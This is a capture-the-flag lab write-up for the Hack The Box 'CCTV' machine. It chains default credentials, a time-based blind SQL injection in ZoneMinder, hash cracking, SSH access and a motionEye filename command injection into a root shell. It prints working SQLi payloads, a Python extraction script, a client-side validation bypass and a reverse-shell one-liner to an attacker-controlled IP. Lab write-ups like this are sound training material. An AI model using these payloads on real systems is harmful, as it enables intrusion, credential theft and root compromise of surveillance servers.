# HTB CCTV — Writeup
**Difficulty:** Easy 
**OS:** Linux (Ubuntu 24.04)
**CVEs:** CVE-2024-51482, CVE-2025-60787
**Author:** Ghaith Al-bayati

---

## Overview

CCTV is a easy-rated Linux machine built around a real-world surveillance stack. The path goes:
default credentials → blind SQL injection → hash cracking → SSH → internal service discovery → command injection → root.

---

## Reconnaissance

Standard nmap shows only two ports open:

```
22/tcp  open  ssh     OpenSSH 9.6p1
80/tcp  open  http    Apache/2.4.58
```

The web server hosts a landing page for "SecureVision CCTV & Security Solutions" — a fake corporate site. The only interesting link is a **Staff Login** button pointing to `/zm/`, which is a ZoneMinder instance running version **1.37.63**.

---

## Foothold — Default Credentials

Before trying anything fancy, always try the obvious. `admin:admin` works.

We're in as admin with a mostly empty ZoneMinder dashboard — no monitors, no events, no cameras. Just a running instance.

---

## CVE-2024-51482 — Blind SQL Injection

ZoneMinder up to v1.37.64 has an **authenticated** SQL injection in `web/ajax/event.php`. The vulnerable code:

```php
$tagId = $_REQUEST['tid'];
dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?', array($tagId, $_REQUEST['id']));
$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";  // ← no sanitization
$rowCount = dbNumRows($sql);
```

The `DELETE` uses parameterized queries (safe), but the `SELECT` concatenates `$tagId` directly. Classic.

### Finding the endpoint

The vulnerable action is `removetag`:
```
/zm/index.php?view=request&request=event&action=removetag&tid=1
```

Normal response:
```json
{"result":"Ok","response":0}
```

### What didn't work (and why)

**GET requests with injection → 500**

Trying `tid=1 AND 1=1` via GET returned HTTP 500. So did `tid=1+0`, `tid=0x31`, `tid=(SELECT SLEEP(5))` — anything non-integer. The middleware was killing the request before it even reached the SQL layer.

**POST requests → empty 500**

Switching to POST got us past the middleware but introduced a new problem. Every injection attempt returned an empty 500. The SQL was executing (proven later), but PHP exceptions were swallowing the errors before any response could be sent.

**Boolean injection → no difference**

`AND 1=1` and `AND 1=2` both returned the same response. Why? The `Events_Tags` table is completely empty — zero rows. MySQL evaluates `WHERE TagId = 1 AND 1=1`, finds no rows immediately, and short-circuits. The right side of `AND` never runs.

**`IF()` and direct `SLEEP()` → no delay**

Same root cause. Empty table = MySQL never evaluates the expression fully.

### The breakthrough — ZoneMinder logs

This is where things got interesting. ZoneMinder has an API endpoint that exposes its internal logs:

```bash
curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/api/logs.json?token=YOUR_JWT'
```

The logs showed **every SQL error the server was generating** — including our injection attempts. Two things stood out:

- Our payloads were reaching the SQL layer after all — they were just crashing PHP with unhandled exceptions


### The working payload

From the logs and research, the working format is:

```
1 AND (SELECT 1 FROM (SELECT SLEEP(5)) as a)
```

The critical difference from everything else:
- Starts with plain `1` — passes the DELETE's parameterized type check
- `FROM (SELECT SLEEP(5)) as a` — the **alias** forces MySQL to fully materialize the subquery before evaluating, regardless of whether any rows exist
- Works via **GET** (not POST)

Confirming it:
```bash
time curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))%20as%20a)&id=1'
# real  5.23s ✓
```

5 seconds. We have our oracle.

### Extracting the hash manually

With time-based injection confirmed, we build a binary search extractor. The logic:
- If condition is **true** → server sleeps ~5s
- If condition is **false** → server responds in ~0.2s

ZoneMinder stores passwords as bcrypt hashes, which means the format always starts with $2y$

Test: is the first character of mark's password `$` (ASCII 36)?

```bash
time curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%20SLEEP(5)%20FROM%20(SELECT%201)%20as%20a%20WHERE%20ASCII(SUBSTRING((SELECT%20Password%20FROM%20zm.Users%20WHERE%20Username%3D%27mark%27),1,1))%3D36)&id=1'
# real  5.19s ✓
```

It slept. First char confirmed as `$` — start of a bcrypt hash.

Rather than doing 60 characters × 7 binary search steps manually (~420 requests), we write a Python script:

```python
import requests, time

TARGET = "http://cctv.htb"
COOKIE = {"ZMSESSID": "YOUR_COOKIE"}
SLEEP = 3
THRESHOLD = 2

def is_true(condition):
    payload = f"1 AND (SELECT SLEEP({SLEEP}) FROM (SELECT 1) as a WHERE {condition})"
    url = f"{TARGET}/zm/index.php?view=request&request=event&action=removetag&tid={payload}&id=1"
    start = time.time()
    requests.get(url, cookies=COOKIE)
    return (time.time() - start) > THRESHOLD

def get_char(query, pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"ASCII(SUBSTRING(({query}),{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else None

def extract(query, length=60):
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        if not c: break
        result += c
        print(f"\r[+] {result}", end="", flush=True)
    print()

extract("SELECT Password FROM zm.Users WHERE Username='mark'")
```

Result:
```
[+] $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

### Cracking the hash

```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# opensesame
```

### SSH as mark

```bash
ssh mark@cctv.htb
# password: opensesame
```
---

## Privilege Escalation — CVE-2025-60787 (motionEye RCE)

### Discovery

Reading through the filesystem as mark:

```bash
ls /etc/motioneye/
# motion.conf  motioneye.conf
cat /etc/motioneye/motion.conf
# Digging through /etc/motioneye/, the config files revealed an internal service bound to port 8765
```

An internal service running on `localhost:8765`. Port forward it:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Browsing to `http://localhost:8765` reveals a **motionEye** instance — another camera management platform, version 0.43.1b4, running as **root**.

### CVE-2025-60787 — Command Injection via Image File Name

motionEye passes the "Image File Name" configuration field directly to the motion daemon as a filename template. When motion captures images, it processes this filename through a shell — meaning shell metacharacters execute as commands.

The payload goes in the Image File Name field:
```
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```

### What didn't work first

The motionEye UI had JavaScript validation blocking anything that looked like a shell command in the filename field. Saving the config with the payload just silently failed.

**Bypass:** override the validation function from the browser console:
```javascript
configUiValid = function() { return true; };
```

This replaces the client-side validation with a function that always returns true. The payload now saves to the server.

### Why it still didn't trigger

After saving the payload, nothing happened for a while. The reason: motionEye only processes image filenames when it's actually **capturing**. With the wrong capture mode, the motion daemon never writes files and never touches the filename template.

Fix: set **Capture Mode** to **Interval Snapshots** with a short interval. This forces motion to actively write files on a schedule, executing the embedded command each time.

### Getting the reverse shell

Set up a listener:
```bash
nc -lvnp 4444
```

Payload in Image File Name:
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Save config (with JS bypass), set capture mode to Interval Snapshots, wait ~10 seconds.

Shell comes back as **root**.

```bash
cat /root/root.txt
cat /home/sa_mark/user.txt

```

---

## Attack Chain Summary

```
Default creds (admin:admin)
        ↓
CVE-2024-51482: time-based blind SQLi in tid parameter
        ↓
Extract mark's bcrypt hash → crack → opensesame
        ↓
SSH as mark → user.txt
        ↓
/etc/motioneye/motion.conf → port 8765
        ↓
SSH port forward → motionEye UI
        ↓
CVE-2025-60787: command injection in Image File Name
Bypass JS validation → set Interval Snapshots → trigger motion
        ↓
Root shell → root.txt
```

---

## Key Lessons

**Check the logs when you're stuck.** The ZoneMinder API exposed every SQL error happening server-side. Without that, we'd have kept guessing blind. Application logs are often the most underrated recon resource.

**Empty tables break AND-based injection.** `WHERE TagId = 1 AND SLEEP(5)` does nothing if no rows match `TagId = 1`. MySQL short-circuits. The subquery alias trick `(SELECT SLEEP(5)) as a` forces evaluation regardless.

**GET vs POST matters.** The vulnerable endpoint behaved completely differently depending on HTTP method — middleware, routing, and PHP logic can all change based on how the request arrives.

**Client-side validation is theater.** One line in the browser console bypassed the entire motionEye frontend security model. Never trust the client.

**Understand your trigger.** The command injection only fires when motion actually processes the filename. Understanding the application's behavior — not just the vulnerability — is what gets you the shell.

---

Write-up by Ghaith Al-bayati — Hack The Box: CCTV
